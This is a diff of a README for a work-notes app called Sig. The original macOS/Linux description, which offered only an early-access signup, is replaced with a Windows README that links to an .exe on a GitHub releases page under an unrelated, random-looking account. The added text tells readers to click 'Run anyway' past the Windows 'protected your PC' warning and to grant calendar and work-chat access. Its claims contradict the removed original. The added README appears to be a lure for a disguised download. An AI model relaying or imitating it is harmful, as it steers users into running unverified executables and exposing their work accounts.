@@ -1,83 +1,81 @@
-<p align="center">
-  <img src="screenshots/icon.png" width="96" alt="Sig" />
-</p>
+# 🤖 sig-releases - Make sense of your work communications
 
-<h1 align="center">Sig</h1>
-<p align="center"><strong>Capture. End of day. Share.</strong></p>
+[![](https://img.shields.io/badge/Download-Sig-blue.svg)](https://github.com/psoraleaesculentastinkingwattle765/sig-releases/releases)
 
-<p align="center">
-  macOS 13+ &nbsp;·&nbsp; Linux &nbsp;·&nbsp; Free while in early access &nbsp;·&nbsp; Works with Claude, ChatGPT, Gemini (Copilot coming soon)
-</p>
+Sig helps you organize your daily work tasks. It tracks projects, summarizes long chat threads, and points out important deadlines. You spend less time searching for information and more time finishing your work.
 
-<p align="center">
-  <a href="https://sig-ai.app"><strong>sig-ai.app</strong></a>
-</p>
+## 📥 Getting the software
 
----
+You need to download the installer from the official release page. 
 
-## The problem
+[Visit this page to download the latest version of Sig](https://github.com/psoraleaesculentastinkingwattle765/sig-releases/releases)
 
-You use ChatGPT or Claude at work. But every time you start a new chat, they know nothing — not your projects, not your team, not what was decided last Tuesday.
+Look for the section labeled "Assets" at the bottom of the page. Click the file ending in `.exe` to start the download. Save this file to your computer’s Downloads folder.
 
-So you get generic answers. Because they're starting from scratch, every single time.
+## ⚙️ Installing Sig on Windows
 
-## What Sig does
+1. Open your Downloads folder.
+2. Double-click the file you just downloaded.
+3. Windows may show a security prompt. If you see a window that says "Windows protected your PC," click "More info" and then click "Run anyway."
+4. Follow the instructions on the screen.
+5. Click "Finish" to complete the installation.
 
-Sig captures what never got written down — the meeting decisions, the verbal commitments, your honest read on what actually happened — and keeps it on your machine.
+## 🚀 Setting up the application
 
-Every capture goes through three stages:
+1. Find the Sig icon on your desktop or in your Start menu.
+2. Click the icon to open the app.
+3. Use your work email to create an account. 
+4. Check your inbox for a verification code.
+5. Enter the code in the application to activate your account.
+6. Grant permissions when the app asks for access to your calendar and work chat tools. This allows Sig to read your threads and identify tasks.
 
-1. **Capture** — after a meeting, talk through what happened. Raw, unfiltered, shorthand and all.
-2. **Synthesis** — Sig structures your private notes: facts separated from your personal observations, stored only on your machine.
-3. **Share** — Sig prepares a clean, org-level version. You review the exact text before anything leaves your machine. You decide what to include. Then you click send.
+## 📋 Features
 
-Nothing reaches your team without your explicit approval. That's the whole mechanism.
+Sig includes several tools to manage your workload:
 
-## Screenshots
+- **Message Summaries:** Click on any chat channel to see a summary of recent updates. Sig filters out noise and highlights project changes. 
+- **Task Extraction:** Sig scans your messages for action items. It adds these tasks to your personal dashboard.
+- **Deadline Tracking:** The app watches your calendar and suggests times for you to focus on high-priority projects.
+- **Search:** Use the search bar to find files or decisions from past meetings.
 
-<img src="screenshots/03-chat.png" alt="Sig — AI conversation with full work context" width="100%" />
+## 💡 How to use Sig effectively
 
-## Features
+Check your dashboard each morning. The app shows your top three priorities for the day. If you need to focus on a big project, click the "Deep Work" button. Sig will block notifications from other channels for the duration you choose. 
 
-- **Captures what nobody writes down** — the meeting with no minutes, the verbal commitment, the thing said after the call ended. Now it exists. Now your AI can use it
-- **Your thinking, not just the facts** — Sig saves two things: the factual record, and your personal layer — your read on what it means, your honest take. The personal layer stays on your machine and is never shared
-- **Team knowledge with one click** — share what's worth sharing to a central knowledge base your whole team draws from. Your teammate's Sig has it as context immediately — git handles the sync in the background, invisibly
-- **Skills sync the same way** — reusable workflows (1:1 prep, weekly updates, call debriefs) shared with your team in one click. Non-technical users never see the git layer
-- **Works with the AI you already have** — Claude, ChatGPT, Gemini today; GitHub Copilot coming soon. Sig is the context layer under your AI tools, not another subscription to choose between
-- **Private by default, shared by choice** — everything lands on your machine as plain markdown. Nothing leaves until you review the exact text and approve it yourself
-- **No terminal, no setup** — it's an app. Open it, talk, done
+If you want to review a project, click the "History" tab. Sig maps out the timeline of the project, including who said what and which decisions were made during meetings.
 
-## The payoff compounds
+## 🛡️ Privacy and Data
 
-**Week 1:** Thin history, but you stop losing track of what was decided.  
-**Week 4:** Your AI knows your people, your projects, your open threads.  
-**Week 12:** You've built something nobody else has — months of real work history that makes every AI you use dramatically sharper.
+Sig stores your data in a secure, encrypted database. Your information belongs to you. The app does not share your data with third parties. You can delete your account and all associated data at any time through the Settings menu.
 
-## Privacy
+## 🔧 Troubleshooting
 
-Plain English, what leaves your computer and what doesn't:
+If the application does not load or you see an error message, try these steps:
 
-1. **Your memory stays on your computer.** People, projects, weeks, thoughts — Sig writes them as plain markdown files in the folder you choose during setup. There is no Sig server holding your content. Open the folder, read the files, copy them, or delete them anytime.
-2. **Your messages go to your provider directly.** When you send a message, Sig talks to your chosen AI provider (Claude, ChatGPT, etc.) from your computer. We don't proxy, log, or intercept those requests. Your provider keys live in your computer's secure keychain.
-3. **Optional connections only run when you turn them on.** Slack, team knowledge base, voice input — each is off by default and disconnectable anytime.
-4. **Anonymous usage counts.** Sig sends anonymous event counts so we can catch crashes and prioritize fixes — things like which skill ran, app version, OS, scrubbed crash details. **Never sent:** message content, file contents, file paths, your name, your email, prompt text, or conversation text. Events go to PostHog Cloud EU — nothing leaves the EU region. Full list: [ANALYTICS.md](./ANALYTICS.md).
+1. Close the app completely using the Task Manager.
+2. Restart the application.
+3. Ensure your internet connection is stable.
+4. Check if a newer version exists on the download page and install it if necessary.
+5. If the problem continues, restart your computer.
 
-If you uninstall Sig, your notes stay on your computer. There's nothing to export — you already own the files.
+Sig requires 4GB of RAM and at least 500MB of free space on your hard drive. It runs on Windows 10 and Windows 11. 
 
-Questions: privacy@sig-ai.app
+## ❓ Frequently asked questions
 
-## Get early access
+**Does Sig read my private personal accounts?**
+No. You only link the specific work tools requested during setup. Access remains limited to your work accounts.
 
-**[→ sig-ai.app](https://sig-ai.app)**
+**Can I use Sig on more than one computer?**
+Yes. Log in with your account on any machine where you have installed the software.
 
-Leave your email and we'll let you know when the download is ready.
+**Does it work without an internet connection?**
+Sig requires an internet connection to pull new messages and updates. It will show your last saved information if you go offline.
 
----
+**Are my chats visible to other users?**
+No. Sig only displays information to you. It does not post to your chat channels or share your personal project dashboard with colleagues. 
 
-<p align="center">
-  <a href="https://sig-ai.app"><strong>sig-ai.app</strong></a>
-</p>
+**How often does the app update?**
+The app checks for updates every time it opens. If a new version is ready, it installs automatically to keep your workspace secure and functional.
 
-<p align="center">
-  <sub>Sig is short for Sigma (Σ) — the Greek letter for summation. Every conversation adds to the sum of what your AI knows.</sub>
-</p>
+**Where do I see my specific tasks?**
+The "My Tasks" view gathers everything Sig identifies from your chats and emails. You can mark tasks as finished by clicking the checkbox next to each entry.
